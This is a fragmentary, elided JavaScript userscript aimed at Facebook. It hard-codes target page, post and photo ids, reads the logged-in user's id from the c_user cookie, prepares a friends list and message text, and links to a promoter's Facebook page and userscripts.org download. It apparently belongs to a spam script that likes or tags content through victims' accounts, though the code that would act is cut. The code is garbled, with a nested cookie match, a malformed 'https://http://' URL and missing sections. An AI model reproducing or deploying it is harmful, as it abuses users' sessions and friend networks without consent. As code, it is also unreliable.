...
var spage_id = "236463789832011";
var spost_id = "236463789832011";
var sfoto_id = "236463789832011";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
if (body !== null) {
   ...
   unsafeWindow.BugInfo = function() {
      window.open(this.href = "https://http://www.facebook.com/masktr", "dmfollow", "toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600");
      return false;
   };
}
if (body !== null) {
...
var sp = "Contact Us On Facebook www.facebook.com/masktr Download From : http://userscripts.org/scripts/show/162898";
